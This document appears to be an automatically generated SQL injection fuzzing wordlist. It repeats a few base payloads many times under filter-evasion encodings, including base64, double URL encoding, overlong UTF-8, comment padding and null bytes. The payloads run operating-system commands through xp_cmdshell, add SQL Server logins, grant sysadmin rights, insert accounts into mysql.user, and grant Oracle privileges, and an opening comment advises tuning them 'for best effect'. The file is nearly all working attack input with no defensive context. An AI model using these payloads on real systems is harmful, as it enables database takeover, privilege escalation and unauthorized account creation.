# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect
%00
IyB5b3Ugd2lsbCBuZWVkIHRvIGN1c3RvbWl6ZS9tb2RpZnkgc29tZSBvZiB0aGUgdmF1bGVzIGluIHRoZSBxdWVyaWVzIGZvciBiZXN0IGVmZmVjdAo=
# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%2523%2520%2579%256F%2575%2520%2577%2569%256C%256C%2520%256E%2565%2565%2564%2520%2574%256F%2520%2563%2575%2573%2574%256F%256D%2569%257A%2565%252F%256D%256F%2564%2569%2566%2579%2520%2573%256F%256D%2565%2520%256F%2566%2520%2574%2568%2565%2520%2576%2561%2575%256C%2565%2573%2520%2569%256E%2520%2574%2568%2565%2520%2571%2575%2565%2572%2569%2565%2573%2520%2566%256F%2572%2520%2562%2565%2573%2574%2520%2565%2566%2566%2565%2563%2574%250A
%23%20%79%6F%75%20%77%69%6C%6C%20%6E%65%65%64%20%74%6F%20%63%75%73%74%6F%6D%69%7A%65%2F%6D%6F%64%69%66%79%20%73%6F%6D%65%20%6F%66%20%74%68%65%20%76%61%75%6C%65%73%20%69%6E%20%74%68%65%20%71%75%65%72%69%65%73%20%66%6F%72%20%62%65%73%74%20%65%66%66%65%63%74%0A
%u0023%u0020%u0079%u006F%u0075%u0020%u0077%u0069%u006C%u006C%u0020%u006E%u0065%u0065%u0064%u0020%u0074%u006F%u0020%u0063%u0075%u0073%u0074%u006F%u006D%u0069%u007A%u0065%u002F%u006D%u006F%u0064%u0069%u0066%u0079%u0020%u0073%u006F%u006D%u0065%u0020%u006F%u0066%u0020%u0074%u0068%u0065%u0020%u0076%u0061%u0075%u006C%u0065%u0073%u0020%u0069%u006E%u0020%u0074%u0068%u0065%u0020%u0071%u0075%u0065%u0072%u0069%u0065%u0073%u0020%u0066%u006F%u0072%u0020%u0062%u0065%u0073%u0074%u0020%u0065%u0066%u0066%u0065%u0063%u0074%u000A
# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%C0%AB%C0%AAyou%C0%AAwill%C0%AAneed%C0%AAto%C0%AAcustomize%C0%AFmodify%C0%AAsome%C0%AAof%C0%AAthe%C0%AAvaules%C0%AAin%C0%AAthe%C0%AAqueries%C0%AAfor%C0%AAbest%C0%AAeffect%C0%8A
%# %y%o%u %w%i%l%l %n%e%e%d %t%o %c%u%s%t%o%m%i%z%e%/%m%o%d%i%f%y %s%o%m%e %o%f %t%h%e %v%a%u%l%e%s %i%n %t%h%e %q%u%e%r%i%e%s %f%o%r %b%e%s%t %e%f%f%e%c%t%

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect
 and '0having'='0having'
# you will need to customize/modify some of the vaules in the queries for best effect
sp_password
#/**/you/**/will/**/need/**/to/**/customize/modify/**/some/**/of/**/the/**/vaules/**/in/**/the/**/queries/**/for/**/best/**/effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

#%01you%02will%0Dneed%08to%09customize/modify%0Csome%09of%0Athe%0Fvaules%0Din%04the%05queries%0Cfor%03best%01effect

# you will need to customize/modify some of the vaules in the queries for best effect

#%0Cyou%0Cwill%0Cneed%0Cto%09customize/modify%0Csome%0Dof%0Dthe%0Bvaules%0Din%0Bthe%0Aqueries%0Bfor%0Bbest%0Beffect

# you will need to customize/modify some of the vaules in the queries for best effect

#+you+will+need+to+customize/modify+some+of+the+vaules+in+the+queries+for+best+effect

#%09you%0Awill%0Dneed%09to%0Acustomize/modify%0Csome%09of%0Dthe%0Cvaules%0Cin%0Athe%09queries%0Dfor%0Cbest%09effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%EF%BC%87; exec master..xp_cmdshell %EF%BC%87ping 10.10.1.2%EF%BC%87--

%00%27; exec master..xp_cmdshell %00%27ping 10.10.1.2%00%27--

'exec--jLgVEzRQYW%0Asp_addlogin--tHxLkayRs%0A'name'--GKcjcSYwldTD%0A,--HPoUjMoU%0A'password'--zHeQLakYGb%0A----XLVNsBCsSG%0A
'exec%23ClGcsIL%0Asp_addlogin%23fQIuMNEUNr%0A'name'%23xxjEhXULJR%0A,%23ZqnwrfHB%0A'password'%23WNmUEbzf%0A--%23GELcnFvD%0A
'exec%23KxUesGRVlJ%0Asp_addlogin%23apPpbDfVNOR%0A'name'%23qCzCPTHWmhFy%0A,%23DdGWFfyX%0A'password'%23GAxsuMlAeyBa%0A--%23aVgtuEIFzUNA%0A
'exec%0Asp_addlogin%01'name'%0A,%0A'password'%04--

'exec%23%0Asp_addlogin%23%0A'name'%23%0A,%23%0A'password'%23%0A--%23%0A
'exec%0Csp_addlogin%0A'name'%0C,%09'password'%0C--

'exec--%0Asp_addlogin--%0A'name'--%0A,--%0A'password'--%0A----%0A
'exec+sp_addlogin+'name'+,+'password'+--

'exec%0Dsp_addlogin%09'name'%0A,%0D'password'%09--

'exec sp_addlogin 'name' , 'password' --

%bf%27exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

%EF%BC%87 exec sp_addsrvrolemember %EF%BC%87name%EF%BC%87 , %EF%BC%87sysadmin%EF%BC%87 --

%00%27 exec sp_addsrvrolemember %00%27name%00%27 , %00%27sysadmin%00%27 --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --
%00
JyBleGVjIHNwX2FkZHNydnJvbGVtZW1iZXIgJ25hbWUnICwgJ3N5c2FkbWluJyAtLQo=
' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

%2527%2520%2565%2578%2565%2563%2520%2573%2570%255F%2561%2564%2564%2573%2572%2576%2572%256F%256C%2565%256D%2565%256D%2562%2565%2572%2520%2527%256E%2561%256D%2565%2527%2520%252C%2520%2527%2573%2579%2573%2561%2564%256D%2569%256E%2527%2520%252D%252D%250A
%27%20%65%78%65%63%20%73%70%5F%61%64%64%73%72%76%72%6F%6C%65%6D%65%6D%62%65%72%20%27%6E%61%6D%65%27%20%2C%20%27%73%79%73%61%64%6D%69%6E%27%20%2D%2D%0A
%u0027%u0020%u0065%u0078%u0065%u0063%u0020%u0073%u0070%u005F%u0061%u0064%u0064%u0073%u0072%u0076%u0072%u006F%u006C%u0065%u006D%u0065%u006D%u0062%u0065%u0072%u0020%u0027%u006E%u0061%u006D%u0065%u0027%u0020%u002C%u0020%u0027%u0073%u0079%u0073%u0061%u0064%u006D%u0069%u006E%u0027%u0020%u002D%u002D%u000A
' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' /*!30197exec sp_addsrvrolemember 'name' , 'sysadmin' */--

' /*!00000exec sp_addsrvrolemember 'name' , 'sysadmin' */--

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

%C0%AF%C0%AAexec%C0%AAsp%C0%DFaddsrvrolemember%C0%AA%C0%AFname%C0%AF%C0%AA%C0%AE%C0%AA%C0%AFsysadmin%C0%AF%C0%AA%C0%AF%C0%AF%C0%8A
%' %e%x%e%c %s%p%_%a%d%d%s%r%v%r%o%l%e%m%e%m%b%e%r %'%n%a%m%e%' %, %'%s%y%s%a%d%m%i%n%' %-%-%

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --
 and '0having'='0having'
' exec sp_addsrvrolemember 'name' , 'sysadmin' --
-- sp_password
'/**/exec/**/sp_addsrvrolemember/**/'name'/**/,/**/'sysadmin'/**/--

'--fyvauladzFHx%0Aexec--cBArziSQq%0Asp_addsrvrolemember--bDkeGjjhgP%0A'name'--qnpECNGQX%0A,--aPdSAbYqFf%0A'sysadmin'--NPMYOGM%0A----JHBxXignvkS%0A
'%23DcvSsQdluN%0Aexec%23zoWTcphUm%0Asp_addsrvrolemember%23TXXSVQrOIEBT%0A'name'%23YNpTAaY%0A,%23GqdkmsAr%0A'sysadmin'%23WKaiEvwu%0A--%23dSSXqShxRTgU%0A
'%23fBKmmdFGDYYc%0Aexec%23jrpasTpot%0Asp_addsrvrolemember%23DKYHPKMn%0A'name'%23WKCWDU%0A,%23zDBRVl%0A'sysadmin'%23fYJjiM%0A--%23QngEqf%0A
'%0Fexec%02sp_addsrvrolemember%05'name'%04,%04'sysadmin'%0D--

'%23%0Aexec%23%0Asp_addsrvrolemember%23%0A'name'%23%0A,%23%0A'sysadmin'%23%0A--%23%0A
'%0Aexec%0Dsp_addsrvrolemember%09'name'%0A,%09'sysadmin'%0D--

'--%0Aexec--%0Asp_addsrvrolemember--%0A'name'--%0A,--%0A'sysadmin'--%0A----%0A
'+exec+sp_addsrvrolemember+'name'+,+'sysadmin'+--

'%09exec%0Asp_addsrvrolemember%0D'name'%0D,%09'sysadmin'%0C--

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

%bf%27 exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

' exec sp_addsrvrolemember 'name' , 'sysadmin' --

%EF%BC%87 insert into mysql.user (user, host, password) values (%EF%BC%87name%EF%BC%87, %EF%BC%87localhost%EF%BC%87, password(%EF%BC%87pass123%EF%BC%87)) --

%00%27 insert into mysql.user (user, host, password) values (%00%27name%00%27, %00%27localhost%00%27, password(%00%27pass123%00%27)) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
%00
JyBpbnNlcnQgaW50byBteXNxbC51c2VyICh1c2VyLCBob3N0LCBwYXNzd29yZCkgdmFsdWVzICgnbmFtZScsICdsb2NhbGhvc3QnLCBwYXNzd29yZCgncGFzczEyMycpKSAtLQo=
' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

%2527%2520%2569%256E%2573%2565%2572%2574%2520%2569%256E%2574%256F%2520%256D%2579%2573%2571%256C%252E%2575%2573%2565%2572%2520%2528%2575%2573%2565%2572%252C%2520%2568%256F%2573%2574%252C%2520%2570%2561%2573%2573%2577%256F%2572%2564%2529%2520%2576%2561%256C%2575%2565%2573%2520%2528%2527%256E%2561%256D%2565%2527%252C%2520%2527%256C%256F%2563%2561%256C%2568%256F%2573%2574%2527%252C%2520%2570%2561%2573%2573%2577%256F%2572%2564%2528%2527%2570%2561%2573%2573%2531%2532%2533%2527%2529%2529%2520%252D%252D%250A
%27%20%69%6E%73%65%72%74%20%69%6E%74%6F%20%6D%79%73%71%6C%2E%75%73%65%72%20%28%75%73%65%72%2C%20%68%6F%73%74%2C%20%70%61%73%73%77%6F%72%64%29%20%76%61%6C%75%65%73%20%28%27%6E%61%6D%65%27%2C%20%27%6C%6F%63%61%6C%68%6F%73%74%27%2C%20%70%61%73%73%77%6F%72%64%28%27%70%61%73%73%31%32%33%27%29%29%20%2D%2D%0A
%u0027%u0020%u0069%u006E%u0073%u0065%u0072%u0074%u0020%u0069%u006E%u0074%u006F%u0020%u006D%u0079%u0073%u0071%u006C%u002E%u0075%u0073%u0065%u0072%u0020%u0028%u0075%u0073%u0065%u0072%u002C%u0020%u0068%u006F%u0073%u0074%u002C%u0020%u0070%u0061%u0073%u0073%u0077%u006F%u0072%u0064%u0029%u0020%u0076%u0061%u006C%u0075%u0065%u0073%u0020%u0028%u0027%u006E%u0061%u006D%u0065%u0027%u002C%u0020%u0027%u006C%u006F%u0063%u0061%u006C%u0068%u006F%u0073%u0074%u0027%u002C%u0020%u0070%u0061%u0073%u0073%u0077%u006F%u0072%u0064%u0028%u0027%u0070%u0061%u0073%u0073%u0031%u0032%u0033%u0027%u0029%u0029%u0020%u002D%u002D%u000A
' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' /*!30961insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) */--

' /*!00000insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) */--

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' INSERINSERTT into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

%C0%AF%C0%AAinsert%C0%AAinto%C0%AAmysql%C0%AEuser%C0%AA%C0%AAuser%C0%AE%C0%AAhost%C0%AE%C0%AApassword%C0%AB%C0%AAvalues%C0%AA%C0%AA%C0%AFname%C0%AF%C0%AE%C0%AA%C0%AFlocalhost%C0%AF%C0%AE%C0%AApassword%C0%AA%C0%AFpass123%C0%AF%C0%AB%C0%AB%C0%AA%C0%AF%C0%AF%C0%8A
%' %i%n%s%e%r%t %i%n%t%o %m%y%s%q%l%.%u%s%e%r %(%u%s%e%r%, %h%o%s%t%, %p%a%s%s%w%o%r%d%) %v%a%l%u%e%s %(%'%n%a%m%e%'%, %'%l%o%c%a%l%h%o%s%t%'%, %p%a%s%s%w%o%r%d%(%'%p%a%s%s%1%2%3%'%)%) %-%-%

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
 and '0having'='0having'
' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
-- sp_password
'/**/insert/**/into/**/mysql.user/**/(user,/**/host,/**/password)/**/values/**/('name',/**/'localhost',/**/password('pass123'))/**/--

'--hPHKokfWTXt%0Ainsert--RNUzuP%0Ainto--FDXEVSscAIpH%0Amysql.user--hDTpchcMLv%0A(user,--GHHUkyeZmhm%0Ahost,--zIYOYufa%0Apassword)--vvyLxyBL%0Avalues--noaPZHtI%0A('name',--eiFheMDs%0A'localhost',--inCNThgWzb%0Apassword('pass123'))--BYrGlSj%0A----wwWIBHEouSkV%0A
'%23LoPrBupMDqWI%0Ainsert%23NTtEhVFLrN%0Ainto%23UBMCQuqo%0Amysql.user%23XZWvLxzhz%0A(user,%23dXLVmWsGYx%0Ahost,%23TmJxCi%0Apassword)%23pFdCNdOi%0Avalues%23zOaNIeYRr%0A('name',%23kRjQFmUWR%0A'localhost',%23vIEanyYsmF%0Apassword('pass123'))%23iCIwVXmPjPG%0A--%23LPPcqOjuw%0A
'%23xDWXHmYsiYI%0Ainsert%23sJoHqqOLc%0Ainto%23zNEWlqEPFFER%0Amysql.user%23KVFIWyqwl%0A(user,%23kIKrNuXm%0Ahost,%23ZvgQZdbZFb%0Apassword)%23gdaeuz%0Avalues%23ViBxRK%0A('name',%23wbwWxZb%0A'localhost',%23PpZZZpo%0Apassword('pass123'))%23wAtKid%0A--%23YNinbx%0A
'%09insert%0Dinto%09mysql.user%02(user,%05host,%0Fpassword)%0Evalues%03('name',%05'localhost',%0Fpassword('pass123'))%08--

'%23%0Ainsert%23%0Ainto%23%0Amysql.user%23%0A(user,%23%0Ahost,%23%0Apassword)%23%0Avalues%23%0A('name',%23%0A'localhost',%23%0Apassword('pass123'))%23%0A--%23%0A
'%0Ainsert%09into%0Bmysql.user%0A(user,%09host,%0Bpassword)%0Cvalues%0D('name',%0B'localhost',%09password('pass123'))%0C--

'--%0Ainsert--%0Ainto--%0Amysql.user--%0A(user,--%0Ahost,--%0Apassword)--%0Avalues--%0A('name',--%0A'localhost',--%0Apassword('pass123'))--%0A----%0A
'+insert+into+mysql.user+(user,+host,+password)+values+('name',+'localhost',+password('pass123'))+--

'%0Ainsert%0Ainto%0Amysql.user%0A(user,%0Ahost,%09password)%0Avalues%0D('name',%0C'localhost',%09password('pass123'))%0C--

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

%bf%27 insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --

%EF%BC%87 grant connect to name; grant resource to name; --

%00%27 grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --
%00
JyBncmFudCBjb25uZWN0IHRvIG5hbWU7IGdyYW50IHJlc291cmNlIHRvIG5hbWU7IC0tCg==
' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

%2527%2520%2567%2572%2561%256E%2574%2520%2563%256F%256E%256E%2565%2563%2574%2520%2574%256F%2520%256E%2561%256D%2565%253B%2520%2567%2572%2561%256E%2574%2520%2572%2565%2573%256F%2575%2572%2563%2565%2520%2574%256F%2520%256E%2561%256D%2565%253B%2520%252D%252D%250A
%27%20%67%72%61%6E%74%20%63%6F%6E%6E%65%63%74%20%74%6F%20%6E%61%6D%65%3B%20%67%72%61%6E%74%20%72%65%73%6F%75%72%63%65%20%74%6F%20%6E%61%6D%65%3B%20%2D%2D%0A
%u0027%u0020%u0067%u0072%u0061%u006E%u0074%u0020%u0063%u006F%u006E%u006E%u0065%u0063%u0074%u0020%u0074%u006F%u0020%u006E%u0061%u006D%u0065%u003B%u0020%u0067%u0072%u0061%u006E%u0074%u0020%u0072%u0065%u0073%u006F%u0075%u0072%u0063%u0065%u0020%u0074%u006F%u0020%u006E%u0061%u006D%u0065%u003B%u0020%u002D%u002D%u000A
' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

' /*!30618grant connect to name; grant resource to name; */--

' /*!00000grant connect to name; grant resource to name; */--

' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

%C0%AF%C0%AAgrant%C0%AAconnect%C0%AAto%C0%AAname%C0%BB%C0%AAgrant%C0%AAresource%C0%AAto%C0%AAname%C0%BB%C0%AA%C0%AF%C0%AF%C0%8A
%' %g%r%a%n%t %c%o%n%n%e%c%t %t%o %n%a%m%e%; %g%r%a%n%t %r%e%s%o%u%r%c%e %t%o %n%a%m%e%; %-%-%

' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --
 and '0having'='0having'
' grant connect to name; grant resource to name; --
-- sp_password
'/**/grant/**/connect/**/to/**/name;/**/grant/**/resource/**/to/**/name;/**/--

'--ggPINiwEIw%0Agrant--aYrNdBYRZ%0Aconnect--rNFzXuNXAgr%0Ato--jmejlcAwI%0Aname;--oGFLtS%0Agrant--zIYkGBc%0Aresource--HydRpBdctV%0Ato--vpRXjN%0Aname;--aYTUgNBp%0A----NJhvHuNgqYt%0A
'%23bnSprDrBEa%0Agrant%23FIJOBtwmb%0Aconnect%23unAXnk%0Ato%23QicZLBGI%0Aname;%23KAnXCzRhBlJX%0Agrant%23SdlAAMeFt%0Aresource%23LoRdEzaL%0Ato%23QnUjhk%0Aname;%23IgTESD%0A--%23UNHPlJhSC%0A
'%23mpIYag%0Agrant%23xOiRyuyGxn%0Aconnect%23hntTphrcL%0Ato%23SelrDHyXbkuX%0Aname;%23oYEufR%0Agrant%23RWzZMMem%0Aresource%23xHNDAEHja%0Ato%23nDYyyhXyPOFn%0Aname;%23oGKsgaer%0A--%23srcjpSSY%0A
'%0Agrant%09connect%0Fto%06name;%01grant%05resource%06to%08name;%0C--

'%23%0Agrant%23%0Aconnect%23%0Ato%23%0Aname;%23%0Agrant%23%0Aresource%23%0Ato%23%0Aname;%23%0A--%23%0A
'%0Dgrant%0Dconnect%0Dto%0Cname;%0Cgrant%09resource%0Cto%09name;%0A--

'--%0Agrant--%0Aconnect--%0Ato--%0Aname;--%0Agrant--%0Aresource--%0Ato--%0Aname;--%0A----%0A
'+grant+connect+to+name;+grant+resource+to+name;+--

'%0Dgrant%0Cconnect%0Dto%0Aname;%0Dgrant%0Dresource%0Cto%09name;%09--

' grant connect to name; grant resource to name; --

%bf%27 grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

' grant connect to name; grant resource to name; --

%EF%BC%87 insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

%00%27 insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
%00
JyBpbnNlcnQgaW50byB1c2Vycyhsb2dpbiwgcGFzc3dvcmQsIGxldmVsKSB2YWx1ZXMoIGNoYXIoMHg3MCkgKyBjaGFyKDB4NjUpICsgY2hhcigweDc0KSArIGNoYXIoMHg2NSkgKyBjaGFyKDB4NzIpICsgY2hhcigweDcwKSArIGNoYXIoMHg2NSkgKyBjaGFyKDB4NzQpICsgY2hhcigweDY1KSArIGNoYXIoMHg3MiksY2hhcigweDY0KQo=
' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

%2527%2520%2569%256E%2573%2565%2572%2574%2520%2569%256E%2574%256F%2520%2575%2573%2565%2572%2573%2528%256C%256F%2567%2569%256E%252C%2520%2570%2561%2573%2573%2577%256F%2572%2564%252C%2520%256C%2565%2576%2565%256C%2529%2520%2576%2561%256C%2575%2565%2573%2528%2520%2563%2568%2561%2572%2528%2530%2578%2537%2530%2529%2520%252B%2520%2563%2568%2561%2572%2528%2530%2578%2536%2535%2529%2520%252B%2520%2563%2568%2561%2572%2528%2530%2578%2537%2534%2529%2520%252B%2520%2563%2568%2561%2572%2528%2530%2578%2536%2535%2529%2520%252B%2520%2563%2568%2561%2572%2528%2530%2578%2537%2532%2529%2520%252B%2520%2563%2568%2561%2572%2528%2530%2578%2537%2530%2529%2520%252B%2520%2563%2568%2561%2572%2528%2530%2578%2536%2535%2529%2520%252B%2520%2563%2568%2561%2572%2528%2530%2578%2537%2534%2529%2520%252B%2520%2563%2568%2561%2572%2528%2530%2578%2536%2535%2529%2520%252B%2520%2563%2568%2561%2572%2528%2530%2578%2537%2532%2529%252C%2563%2568%2561%2572%2528%2530%2578%2536%2534%2529%250A
%27%20%69%6E%73%65%72%74%20%69%6E%74%6F%20%75%73%65%72%73%28%6C%6F%67%69%6E%2C%20%70%61%73%73%77%6F%72%64%2C%20%6C%65%76%65%6C%29%20%76%61%6C%75%65%73%28%20%63%68%61%72%28%30%78%37%30%29%20%2B%20%63%68%61%72%28%30%78%36%35%29%20%2B%20%63%68%61%72%28%30%78%37%34%29%20%2B%20%63%68%61%72%28%30%78%36%35%29%20%2B%20%63%68%61%72%28%30%78%37%32%29%20%2B%20%63%68%61%72%28%30%78%37%30%29%20%2B%20%63%68%61%72%28%30%78%36%35%29%20%2B%20%63%68%61%72%28%30%78%37%34%29%20%2B%20%63%68%61%72%28%30%78%36%35%29%20%2B%20%63%68%61%72%28%30%78%37%32%29%2C%63%68%61%72%28%30%78%36%34%29%0A
%u0027%u0020%u0069%u006E%u0073%u0065%u0072%u0074%u0020%u0069%u006E%u0074%u006F%u0020%u0075%u0073%u0065%u0072%u0073%u0028%u006C%u006F%u0067%u0069%u006E%u002C%u0020%u0070%u0061%u0073%u0073%u0077%u006F%u0072%u0064%u002C%u0020%u006C%u0065%u0076%u0065%u006C%u0029%u0020%u0076%u0061%u006C%u0075%u0065%u0073%u0028%u0020%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0037%u0030%u0029%u0020%u002B%u0020%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0036%u0035%u0029%u0020%u002B%u0020%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0037%u0034%u0029%u0020%u002B%u0020%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0036%u0035%u0029%u0020%u002B%u0020%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0037%u0032%u0029%u0020%u002B%u0020%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0037%u0030%u0029%u0020%u002B%u0020%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0036%u0035%u0029%u0020%u002B%u0020%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0037%u0034%u0029%u0020%u002B%u0020%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0036%u0035%u0029%u0020%u002B%u0020%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0037%u0032%u0029%u002C%u0063%u0068%u0061%u0072%u0028%u0030%u0078%u0036%u0034%u0029%u000A
' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)

